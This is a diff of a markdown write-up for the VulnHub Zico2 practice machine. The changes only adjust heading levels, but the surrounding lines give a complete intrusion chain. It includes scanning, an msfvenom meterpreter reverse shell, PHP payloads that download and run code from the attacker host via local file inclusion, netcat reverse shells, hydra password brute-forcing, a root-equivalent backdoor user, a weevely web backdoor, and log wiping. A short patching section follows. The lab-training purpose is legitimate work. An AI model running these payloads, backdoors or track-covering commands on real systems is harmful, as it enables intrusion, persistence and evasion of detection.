@@ -13,8 +13,8 @@ A method of learning how to find vulnerabilities in a system. Simulations on eth
 https://www.vulnhub.com/entry/zico2-1,210/
 
 ## Methodology & Technique
-## Reconnaissance
-### Network Mapping
+### Reconnaissance
+#### Network Mapping
 ```
 nmap -A -v -T5 -sS 192.168.1.1
 
@@ -24,7 +24,7 @@ nmap -A -v -T5 -sS 192.168.1.1
 -sS = TCP SYN/Connect()/ACK/Window/Maimon scans
 ```
 
-### Information Gathering/Footprinting
+#### Information Gathering/Footprinting
 ```
 ping 192.168.1.1
 telnet 192.168.1.1 80
@@ -36,8 +36,8 @@ curl -I 192.168.1.1
 -I = Fetch the headers only!
 ```
 
-## Reporting
-### Creating Reconnaissance Report
+### Reporting
+#### Creating Reconnaissance Report
 ```
 nmap -A -v -T5 -sS 192.168.1.1 -oN 192.168.1.1-top10TCP.nmap
 
@@ -48,8 +48,8 @@ nmap -A -v -T5 -sS 192.168.1.1 -oN 192.168.1.1-top10TCP.nmap
 -oN = Output scan in normal
 ```
 
-## Scanning
-### Web Object Scanning
+### Scanning
+#### Web Object Scanning
 ```
 dirsearch -u http://192.168.1.1 -w /usr/share/dirb/wordlists/common.txt -e php
 
@@ -58,7 +58,7 @@ dirsearch -u http://192.168.1.1 -w /usr/share/dirb/wordlists/common.txt -e php
 -e = Extensions
 ```
 
-### Web Vulnerabilities Scanning
+#### Web Vulnerabilities Scanning
 ```
 uniscan -u 192.168.1.1 -qweds
 
@@ -70,19 +70,19 @@ uniscan -u 192.168.1.1 -qweds
 -s = Enable Static checks
 ```
 
-## Exploitation
-### Searching Exploit
+### Exploitation
+#### Searching Exploit
 ```
 searchsploit phpliteadmin
 cat /opt/searchsploit/exploits/php/webapps/24044.txt
 ```
 
-### Google Dorking
+#### Google Dorking
 ```
 inurl: phpliteadmin default password
 ```
 
-### Creating Meterpreter Shell
+#### Creating Meterpreter Shell
 ```
 msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf -o shell
 mv shell /usr/share/nginx/html/
@@ -93,7 +93,7 @@ vim /usr/databases/meterpreter_reverse_tcp_shell.php
 <?php system("cd /tmp; wget http://192.168.1.2/shell; chmod 777 shell; ./shell"); ?>
 ```
 
-### Creating Meterpreter Exploit
+#### Creating Meterpreter Exploit
 ```
 service postgresql start
 msfconsole
@@ -106,12 +106,12 @@ set LPORT 443
 exploit
 ```
 
-### Accessing Meterpreter Shell
+#### Accessing Meterpreter Shell
 ```
 http://192.168.1.1/view.php?page=../../usr/databases/meterpreter_reverse_tcp_shell.php
 ```
 
-### Accessing Pseudo-Terminal
+#### Accessing Pseudo-Terminal
 ```
 shell
 ```
@@ -123,7 +123,7 @@ pty = Pseudo-terminal utilities
 pty.spawn = Module for controling pseudo-terminal
 ```
 
-### Creating Reverse Shell
+#### Creating Reverse Shell
 ```
 cd /usr/share/nginx/html
 vim shell.txt
@@ -139,7 +139,7 @@ vim /usr/databases/php_system_reverse_shell.php
 <?php system("wget http://192.168.1.2/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>
 ```
 
-### Accessing Reverse Shell
+#### Accessing Reverse Shell
 ```
 nc -lvp 1234 / netcat -lvp 1234
 
@@ -156,7 +156,7 @@ bash -i
 -i = Shell is interactive
 ```
 
-## Gaining Access
+### Gaining Access
 ```
 hydra -l root -P /opt/rockyou.txt ssh://192.168.1.1:22
 
@@ -181,7 +181,7 @@ define('DB_COLLATE', '');
 ssh zico@192.168.1.1
 ```
 
-## Privilige Escalation
+### Privilige Escalation
 ```
 sudo -l
 touch /tmp/privesc
@@ -200,8 +200,8 @@ whoami
 id root
 ```
 
-## Backdooring
-### Creating Backdoored User Login
+### Backdooring
+#### Creating Backdoored User Login
 ```
 useradd -ou 0 -g 0 zombie
 passwd zombie
@@ -212,7 +212,7 @@ id zombie
 -g = --gid (Group ID)
 ```
 
-### Creating PHP Backdoored
+#### Creating PHP Backdoored
 ```
 weevely generate b@cKd00r3d /usr/share/nginx/html/backdoored
 chmod 777 /usr/share/nginx/html/backdoored
@@ -222,7 +222,7 @@ vim /usr/databases/post_exploitation_backdoored.php
 <?php system("cd /tmp; wget http://192.168.1.2/backdoored; chmod 777 backdoored; mv backdoored backdoored.php"); ?>
 ```
 
-### Accessing PHP Backdoored
+#### Accessing PHP Backdoored
 ```
 http://192.168.1.1/view.php?page=../../usr/databases/post_exploitation_backdoored.php
 ```
@@ -230,7 +230,7 @@ http://192.168.1.1/view.php?page=../../usr/databases/post_exploitation_backdoore
 weevely http://192.168.1.1/view.php?page=../../tmp/backdoored.php b@cKd00r3d
 ```
 
-## Covering Tracks
+### Covering Tracks
 ```
 cat /dev/null > /var/log/auth.log
 cat /dev/null > /var/log/apache2/access.log
@@ -240,8 +240,8 @@ cat /dev/null > ~/.bash_history && history -c
 -c = Clear the history list
 ```
 
-## Vulnerability Patching
-### Vulnerable Code
+### Vulnerability Patching
+#### Vulnerable Code
 ```
 cd /var/www/dbadmin
 cat view.php
@@ -253,7 +253,7 @@ cat view.php
 ?>
 ```
 
-### Patch Code
+#### Patch Code
 ```
 vim view.php-patch
 ```
